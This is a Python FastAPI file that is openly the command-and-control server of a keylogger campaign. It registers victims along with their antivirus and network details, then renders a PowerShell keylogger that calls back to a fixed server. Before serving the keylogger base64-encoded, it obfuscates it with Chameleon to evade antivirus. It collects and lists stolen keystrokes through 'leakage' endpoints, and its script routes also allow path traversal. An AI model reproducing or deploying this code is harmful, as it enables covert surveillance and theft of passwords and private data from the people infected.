from fastapi import FastAPI
from chameleon.chameleon import Chameleon
import tempfile
from jinja2 import Environment, FileSystemLoader
import os
import base64
import json
import logging
from pydantic import BaseModel
from datetime import datetime

from typing import Any


class KeylogData(BaseModel):
    keylog: str


class Network(BaseModel):
    public: str
    LAN: Any


class Register(BaseModel):
    userid: str
    AVs: dict[str, str]
    network: Network
    sys: Any


app = FastAPI()

DB = {}


def get_chameleon(id: str):
    config = {
        "strings": True,
        "variables": True,
        "data-types": True,
        "functions": True,
        "comments": False,
        "spaces": True,
        "cases": True,
        "nishang": True,
        "backticks": False,
        "random-backticks": True,
        "backticks-list": False,
        "hex-ip": True,
        "random-type": 'r',
        "decimal": False,
        "base64": True,
        "tfn-values": True,
        "safe": True,
        "verbose": False
    }
    env = Environment(loader=FileSystemLoader('./scripts'))
    template = env.get_template('phase3_keylogger.ps1')

    data = {"server": "10.10.10.10", "port": "55899", "id": id}
    output = template.render(data)

    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write(output)
        temp_file_name = f.name

    obfustacated_file = tempfile.NamedTemporaryFile(mode='rb+', delete=False)

    chameleon = Chameleon(filename=temp_file_name, outfile=obfustacated_file.name, config=config, fmap=None)
    chameleon.obfuscate()
    chameleon.write_file()

    script = obfustacated_file.read()

    logging.debug(base64.b64encode(script).decode('utf-8'))
    return base64.b64encode(script).decode('utf-8')


@app.post("/{id}")
async def leakage(id: str, info: Register):
    if id not in DB:
        DB[id] = {
            'info': info,
            'keylog': {}}
    return get_chameleon(id)


@app.get("/scripts/{script}/base64")
async def get_b64script(script: str):
    with open("./scripts/" + script, 'rb') as f:
        data = f.read()
        return base64.b64encode(data)

@app.get("/scripts/{script}")
async def get_b64script(script: str):
    with open("./scripts/" + script, 'r') as f:
        data = f.read()
        return data


@app.get("/{id}")
async def get_leaked_info(id: str):
    if id not in DB:
        return {}
    else:
        return {id: DB[id]}


@app.get("/")
async def get_all_leaked_info():
    return DB


@app.post("/keylog/{id}")
async def keylog(id: str, keylog: KeylogData):
    current_time = datetime.now().strftime("%Y-%m-%d|%H:%M:%S")
    if id in DB:
        DB[id]['keylog'][current_time] = keylog.keylog

    return {}


@app.get("/keylog/{id}")
async def get_keylog(id: str):
    if id not in DB:
        return {}
    else:
        return DB[id]['keylog']
